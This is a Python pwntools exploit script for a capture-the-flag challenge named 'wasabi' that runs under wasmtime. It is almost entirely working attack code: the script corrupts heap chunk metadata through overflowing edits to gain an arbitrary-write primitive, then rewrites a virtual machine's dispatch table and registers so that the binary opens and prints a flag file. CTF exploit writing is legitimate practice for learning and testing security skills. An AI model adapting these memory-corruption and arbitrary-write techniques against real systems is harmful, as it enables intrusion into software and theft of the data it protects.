from pwn import *
from hashlib import *

r = process(["./wasmtime", "--dir=.", "wasabi.release"])


def add(sz, dt):
    r.sendline("1")
    r.recvuntil("size:")
    r.sendline(str(sz))
    r.recvuntil("content:")
    r.sendline(dt)


def edit(idx, sz, dt):
    r.sendline("2")
    r.recvuntil("idx:")
    r.sendline(str(idx))
    r.recvuntil("size:")
    r.sendline(str(sz))
    r.recvuntil("content:")
    r.sendline(dt)


def edit_inf(idx, sz, dt):
    r.sendline("7")
    r.recvuntil("idx:")
    r.sendline(str(idx))
    r.recvuntil("size:")
    r.sendline(str(sz))
    r.recvuntil("content:")
    r.sendline(dt)


def arb_write(addr, size, data):
    edit_inf(8, 0x31, "d"*0x10 + p32(0x18) + p32(0x22) + p32(0x1) + p32(0x10) + p32(0x0) + p32(0x2) + p32(0x300) + p32(addr))
    edit_inf(7, size + 1, data)

r.recvuntil("wasabi?")
r.sendline("im_hungry_pls_help_e")

r.recvuntil("Quit")

add(16, "a"*15)
add(16, "b"*15)
payload = "c"*0x18 + p32(0x0) + p32(0x23) + "c"*0x8
add(48, payload)

edit(6, 31, "a"*16 + p32(0x0) + p32(0x7b)[:-1])

r.sendline("3")
r.sendline("7")
payload = "d"*0x10 + p32(0x18) + p32(0x22)
payload += p32(0x1) + p32(0x10) + p32(0x0) + p32(0x2)
payload += p32(0x300) + p32(0x12131)
add(80, payload)
edit(7, 0x41, sha512("hash").digest())

'''
Prerequisite:
reg1 == reg6
reg2 = open flag
reg4 = open flag
reg5 = 1
mem[reg1] = "flag.wasabi"

9[open] (0, 1, 2)
7 (1, 0, 3)
1 (2, 1, 0)
7 (3, 2, 0)
1 (4, 2, 3)
3 (5, 4, 4)
9[open] (7, 1, 4)
LOOP:
8[write] (6, 1, 0)
17[read] (7, 6, 3)
8[write] (1, 6, 0)
1 (1, 1, 0)
14 (5, 1, 2)
13[jmp] (-5, 0, 0)
19 (8, 8, 6)
'''

for i in range(19):
    # fill nop_ok
    arb_write(0x12320 + 4 * i, 4, p32(10 + 19))

# vt 13 = jmp
arb_write(0x1231c + 4 * 13, 4, p32(10 + 12))
# vt 9 = open
arb_write(0x1231c + 4 * 9, 4, p32(10 + 15))
# vt 17 = read
arb_write(0x1231c + 4 * 17, 4, p32(10 + 16))
# vt 14 = write
arb_write(0x1231c + 4 * 14, 4, p32(10 + 17))

# reg1 = 0x100
arb_write(0x400 + 2 * 1, 2, p16(0x100))
# reg2 = open flag 1
arb_write(0x400 + 2 * 2, 2, p16(0x400))
# reg4 = open flag 2
payload = p16(0x400)
# reg5 = 1
payload += p16(1)
# reg6 = 0x100
payload += p16(0x100)
arb_write(0x400 + 2 * 4, 6, payload)

# mem[0x100] = "flag.wasabi"
arb_write(0x440 + 0x100, 14, "./flag.wasabi")

r.sendline("4")
r.sendline("hash")

r.recvuntil("So u like this flavor, right? ")
print r.recvline().strip()
print r.recvline().strip()
r.close()
